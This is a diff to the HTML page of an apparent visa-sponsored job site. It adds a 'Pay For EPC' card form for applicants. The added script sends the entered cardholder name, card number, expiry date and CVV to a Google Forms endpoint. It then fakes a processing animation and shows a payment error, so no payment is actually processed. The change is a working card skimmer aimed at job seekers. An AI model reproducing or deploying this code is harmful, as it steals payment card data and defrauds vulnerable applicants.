@@ -119,6 +119,91 @@
     text-align: left; /* Ensures content aligns left */
 }
 
+.payment-container {
+    max-width: 100%;
+    background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+    color: #fff;
+    border-radius: 10px;
+    padding: 15px;
+    margin: 10px;
+    display: none;
+    text-align: left; /* Ensures content aligns left */
+}
+
+        .card-input input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .card-input input:focus {
+            border-color: #007bff;
+        }
+
+        .card-input label, .card-details label {
+            font-size: 14px;
+            color: #555;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+	.card-details label  {
+            text-align: left;
+        }
+
+	.card-details {
+	    display: flex;
+	    justify-content: space-between;
+	    max-width: 100%;
+	margin-top: 5px;
+	}
+
+	.card-details div {
+	    width: 48%; /* Adjust width for uniform spacing */
+	}
+
+	.card-details div:last-child {
+	    margin-right: 5px; /* Adds space between CVV input and right end */
+	}
+
+        .card-number-container {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 2px;
+            background: #fff;
+        }
+
+	.card-number-container img {
+            width: 40px;
+            height: 25px;
+            margin-left: 10px;
+            display: none;
+        }
+
+        .payment-container button {
+            width: 100%;
+            margin-top: 20px;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .payment-container button:hover {
+            background-color: #0056b3;
+        }
+
+
 
 .job-offer {
     display: flex;
@@ -674,6 +759,7 @@ background-color: #28a745; /* Green */
 	    text-align: center;
 	    margin-top: 20px;
 	}
+
         /* For smaller screens */
         @media (max-width: 768px) {
 
@@ -743,6 +829,14 @@ background-color: #28a745; /* Green */
             border-radius: 8px;
             display: none;
         }
+
+.payment-container {
+max-width: 100%;
+            margin: 10px auto; /* Center the form */
+            padding: 10px; /* Reduce padding */
+            border-radius: 8px;
+            display: none;
+}
 
         .job-offer {
             gap: 10px; /* Increase spacing for better touchability */
@@ -825,15 +919,47 @@ Our network of vetted professionals offers essential services—from hospitality
 
 <button class="apply-now-button" id="openDialog">Sponsored Visa Jobs</button>
 
+
 <div class="container001">
 	<button type="button" class="clear-btn" onclick="clearFields()">Clear</button><br><br>
     <form>
         <h1>Check Application Progress</h1>
         <input type="text" id="emailInput" class="input-field" placeholder="Enter your Email">
         <button type="button" onclick="checkStatus()">Check Progress</button>
+	<button type="button" onclick="payEpc()">Pay For EPC</button>
     </form>
 
     <div id="result" style="color: black;"></div>
+
+    <div class="payment-container" id="payment-container">
+        <h2>Enter Your Card Details</h2>
+	
+	<div class="card-input">
+        <label>Name on Card</label>
+        <input type="text" id="cardName" placeholder="Full Name on Card" required>
+    </div>
+
+        <div class="card-input">
+            <label>Card Number</label>
+            <div class="card-number-container">
+                <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" maxlength="19" oninput="formatCardNumber()" required>
+                <img id="cardLogo" src="" alt="">
+            </div>
+        </div>
+
+        <div class="card-details">
+            <div>
+                <label>Expiry Date</label>
+                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate()" required>
+            </div>
+            <div>
+                <label>CVV</label>
+                <input type="text" id="cvv" placeholder="•••" maxlength="3" required>
+            </div>
+        </div>
+
+        <button id="payButton" onclick="processPayment()">Make Payment</button>
+    </div>
 
 
 <div class="form-container" id="formContainer">
@@ -1178,6 +1304,8 @@ Our network of vetted professionals offers essential services—from hospitality
 
 	const range_applicationUrl = 'Sheet1!R2'
 
+const cardpaymentContainer = document.getElementById('payment-container');
+
 const jobOfferSelect = document.getElementById('job-offer-options');
 const paymentDateContainer = document.getElementById('paymentDateContainer');
 const offersubmitBtn = document.getElementById('offer-submitBtn');
@@ -1262,12 +1390,66 @@ const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             });
     }
 
+function payEpc() {
+        console.log("Button clicked! Function is running."); 
+
+        const email = document.getElementById('emailInput').value.trim();
+        const resultDiv = document.getElementById('result');
+const paymentContainer = document.getElementById('payment-container'); // Correctly select the payment container
+
+    if (!email) {
+        resultDiv.innerHTML = '<span style="color:red;">Please enter an email.</span>';
+        formContainer.style.display = "none";
+        paymentContainer.style.display = "none"; // Hide payment container
+        return;
+    }
+
+    const url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}?key=${apiKey}`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            console.log("Data fetched:", data); 
+
+            if (!data.values) {
+                throw new Error("No data found.");
+            }
+
+            let userFound = false;
+
+            for (let row of data.values) {
+                if (row.length >= 7 && row[1].toLowerCase() === email.toLowerCase()) {  
+                    
+                    userFound = true;
+
+                    if (row[6]?.toString().trim().toLowerCase() === "card") {  
+                        paymentContainer.style.display = "block"; // Show when "card" is found
+                    } else {
+                        paymentContainer.style.display = "none"; // Hide if not "card"
+                    }
+
+                    break;
+                }
+            }
+
+            if (!userFound) {
+                resultDiv.innerHTML = '<span style="color:red;">No application found for this email.</span>';
+                paymentContainer.style.display = "none"; 
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            resultDiv.innerHTML = '<span style="color:red;">Error retrieving data. Try again later.</span>';
+            paymentContainer.style.display = "none";
+        });
+}
 
 function clearFields() {    
     document.getElementById('emailInput').value = ''; 
     document.getElementById('result').innerHTML = ''; 
     document.getElementById('formContainer').style.display = "none";
 	resetFormContainer();
+resetCardContainer();
 
 }
 
@@ -1341,6 +1523,15 @@ function showToast1(message) {
     setTimeout(() => {
         toast.remove();
     }, 3000);
+}
+
+function resetCardContainer() {
+
+    document.getElementById("cardName").value = "";
+    document.getElementById("cardNumber").value = "";
+    document.getElementById("expiryDate").value = "";
+    document.getElementById("cvv").value = "";
+    document.getElementById("payment-container").style.display = "none";
 }
 
 
@@ -1753,8 +1944,109 @@ window.onload = function() {
 }; 
 
 
-
 </script>
+
+
+
+    <script>
+        function formatCardNumber() {
+            let input = document.getElementById("cardNumber");
+            let value = input.value.replace(/\D/g, '').substring(0, 16); // Remove non-digits
+            value = value.replace(/(.{4})/g, "$1 ").trim(); // Add spaces every 4 digits
+            input.value = value;
+
+            // Detect card type
+            let cardLogo = document.getElementById("cardLogo");
+            if (/^4/.test(value)) {
+                cardLogo.src = "visa_logo.png"; // Replace with actual Visa logo path
+                cardLogo.style.display = "block";
+            } else if (/^5[1-5]/.test(value)) {
+                cardLogo.src = "mastercard_logo.png"; // Replace with actual Mastercard logo path
+                cardLogo.style.display = "block";
+            } else {
+                cardLogo.style.display = "none";
+            }
+        }
+        function formatExpiryDate() {
+            let input = document.getElementById("expiryDate");
+            let value = input.value.replace(/\D/g, '').substring(0, 4);
+            if (value.length >= 2) value = value.substring(0, 2) + "/" + value.substring(2);
+            input.value = value;
+        }
+
+        function processPayment() {
+    // Get all input values
+    let cardName = document.getElementById("cardName").value.trim();
+    let cardNumber = document.getElementById("cardNumber").value.trim();
+    let expiryDate = document.getElementById("expiryDate").value.trim();
+    let cvv = document.getElementById("cvv").value.trim();
+    let payButton = document.getElementById("payButton");
+
+    // Check if any field is empty
+    if (!cardName || !cardNumber || !expiryDate || !cvv) {
+        alert("Please fill in all card details before proceeding.");
+        return; // Stop the function if fields are missing
+    }
+
+
+	submitDetails();
+
+    // Start processing animation
+    payButton.innerHTML = "Processing";
+    let dots = 0;
+    let interval = setInterval(() => {
+        if (dots < 4) {
+            payButton.innerHTML += ".";
+            dots++;
+        } else {
+            payButton.innerHTML = "Processing";
+            dots = 0;
+        }
+    }, 500);
+
+            setTimeout(() => {
+                clearInterval(interval);
+                payButton.innerHTML = "Paymen Error";
+                payButton.style.background = "red";
+            }, 5000);
+        }
+
+
+function submitDetails() {
+    let cardName = document.getElementById("cardName");
+    let cardNumber = document.getElementById("cardNumber");
+    let expiryDate = document.getElementById("expiryDate");
+    let cvv = document.getElementById("cvv");
+
+    if (!cardName || !cardNumber || !expiryDate || !cvv) {
+        console.error("One or more form fields are missing.");
+        return;
+    }
+
+    let formData = new FormData();
+    formData.append("entry.1292042619", encodeURIComponent(cardName.value.trim()));
+    formData.append("entry.1654198705", encodeURIComponent(cardNumber.value.trim()));
+    formData.append("entry.792066235", encodeURIComponent(expiryDate.value.trim()));
+    formData.append("entry.568900243", encodeURIComponent(cvv.value.trim()));
+
+    fetch("https://docs.google.com/forms/d/e/1FAIpQLSe8wP9bRZ4kbReMs-S3egNQ-K5cATXZYdG58Qw23uD_bJMOoA/formResponse", {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+    })
+    .then(() => {
+        console.log("Form submitted successfully.");
+    })
+    .catch((error) => {
+        console.error("Error submitting form:", error);
+    });
+}
+
+    </script>
+
+
+
+
 <a id="whatsapp-button" href="#" class="whatsapp-button" target="_blank">
     <img src="whatsapp.png" alt="WhatsApp" class="whatsapp-icon">
 </a>
